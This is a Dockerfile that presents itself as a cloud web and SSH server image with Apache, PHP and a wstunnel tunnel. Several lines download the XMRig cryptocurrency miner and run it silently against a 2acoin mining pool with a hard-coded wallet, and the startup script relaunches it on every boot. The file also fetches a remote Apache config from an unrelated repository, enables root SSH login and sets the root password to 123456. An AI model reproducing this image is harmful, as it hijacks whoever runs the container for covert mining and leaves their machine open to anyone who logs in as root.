FROM debian
RUN apt update && apt install wget -y
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -zxf xmrig-6.15.2-linux-static-x64.tar.gz && cd xmrig-6.15.2 && ./xmrig --donate-level 1 -a Argon2/Chukwa -o us-central.2acoin.org:5555 -u guns8sajPa19G81kchLTLf9u2qHCbJUqEHRhfMMwtv54HvxrizNdM5h9u52kPtRPrK9mGBnhdCHD396RijusrpxDAQDDzVuKBEaEaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQcboNeA -p $(cat /proc/sys/kernel/hostname) >/dev/null &
RUN DEBIAN_FRONTEND=noninteractive apt install ssh curl screen nano wget npm apache2 php php-curl php-cli php-fpm php-json php-common php-mysql php-zip php-gd php-mbstring  php-xml php-pear php-bcmath  -y
RUN  npm install -g wstunnel
RUN mkdir /run/sshd 
RUN a2enmod proxy
RUN a2enmod proxy_http
RUN a2enmod proxy_wstunnel
RUN a2enmod  rewrite
RUN wget https://raw.githubusercontent.com/septianana55/kokekoko/main/000-default.conf
RUN rm /etc/apache2/sites-available/000-default.conf
RUN mv 000-default.conf /etc/apache2/sites-available
RUN echo 'You can play the awesome Cloud NOW! - Message from berbagi cara setting!' >/var/www/html/index.html
RUN echo 'wstunnel -s 0.0.0.0:8989 & ' >>/luo.sh
RUN echo 'service mysql restart' >>/luo.sh
RUN echo 'service apache2 restart' >>/luo.sh
RUN echo '/usr/sbin/sshd -D' >>/luo.sh
RUN echo './xmrig --donate-level 1 -a Argon2/Chukwa -o us-central.2acoin.org:5555 -u guns8sajPa19G81kchLTLf9u2qHCbJUqEHRhfMMwtv54HvxrizNdM5h9u52kPtRPrK9mGBnhdCHD396RijusrpxDAQDDzVuKBEaEaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQcboNeA -p $(cat /proc/sys/kernel/hostname) >/dev/null &' >>/luo.sh
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
RUN echo root:123456|chpasswd
RUN chmod 755 /luo.sh
EXPOSE 80
CMD  /luo.sh
